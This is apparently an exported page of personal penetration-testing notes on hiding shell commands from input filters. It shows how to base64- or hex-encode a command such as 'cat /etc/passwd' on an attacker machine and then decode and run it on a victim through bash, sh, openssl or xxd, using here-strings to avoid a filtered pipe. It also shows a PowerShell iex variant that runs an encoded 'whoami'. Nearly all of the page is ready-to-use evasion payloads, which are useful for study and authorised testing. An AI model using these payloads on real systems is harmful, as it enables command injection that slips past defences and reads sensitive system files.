<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Encoded Commands (Linux Windows)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Encoded Commands (Linux Windows)</h1><br/><br /><br /><strong><h3>Linux</h3></strong><br />To encode a command we need :<br />1. first encode the command on the local attacker machine<br />2. decode it on the victim machine on runtime<br /><br />1. Encode the payload that we want to execute<br />    To encode a command we can use:<br />     ◇ base64 (for b64 encoding)<br />    <div class="codebox"><pre>echo -n &#39;cat /etc/passwd&#39; | base64</pre></div><br />    <a href=""><img src="images/2437-1.png" alt="images/2437-1.png" /></a><br />   ◇ xxd (for hex encoding)<br />    <div class="codebox"><pre>echo -n &#39;cat /etc/passwd&#39; | xxd -p</pre></div><br />    <a href=""><img src="images/2437-2.png" alt="images/2437-2.png" /></a><br />2. Create a command that will decode the encoded string in a sub-shell ($()), and then pass it to bash to be executed<br />    <div class="codebox"><pre>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dk)</pre></div><br />    <a href=""><img src="images/2437-3.png" alt="images/2437-3.png" /></a><br />    To decode the command since some commands could be blacklisted we can try also<br />   ◇ instead of bash for code execution<br />      ▪ sh<br />        <div class="codebox"><pre>sh&lt;&lt;&lt;$(openssl enc -base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dk)</pre></div><br />        <a href=""><img src="images/2437-4.png" alt="images/2437-4.png" /></a><br />   ◇ instead of base64 for b64 decoding<br />      ▪ openssl<br />       <div class="codebox"><pre>sh&lt;&lt;&lt;$(openssl enc -base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dk)</pre></div><br />       <a href=""><img src="images/2437-5.png" alt="images/2437-5.png" /></a><br />   ◇ xxd for hex decoding<br />      <div class="codebox"><pre>sh&lt;&lt;&lt;$(echo &#39;636174202f6574632f706173737764&#39; | xxd -p -r)</pre></div><br />       <a href=""><img src="images/2437-6.png" alt="images/2437-6.png" /></a><br /><br /><br /><span style="text-decoration:underline;">Note:</span> we are using &lt;&lt;&lt; to avoid using a pipe |, which is a filtered character.<br /><br /><br /><br /><strong><h3>Windows</h3></strong><br />1. To base64 encode our string<br />   ◇ Powershell<br />       <div class="codebox"><pre>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))</pre></div><br />       <a href=""><img src="images/2437-7.png" alt="images/2437-7.png" /></a><br />   ◇ Bash<br />       We can do also the same thing in Bash but we need to convert the string from utf-8 to utf-16 before we base64 it<br />       <div class="codebox"><pre>echo -n whoami | iconv -f utf-8 -t utf-16le | base64</pre></div><br />        <a href=""><img src="images/2437-8.png" alt="images/2437-8.png" /></a><br />2. Decode the b64 string and execute it with a PowerShell sub-shell (ies &quot;$()&quot;)<br />    <div class="codebox"><pre>iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&quot;</pre></div><br />    <a href=""><img src="images/2437-9.png" alt="images/2437-9.png" /></a></div>
</body>
</html>
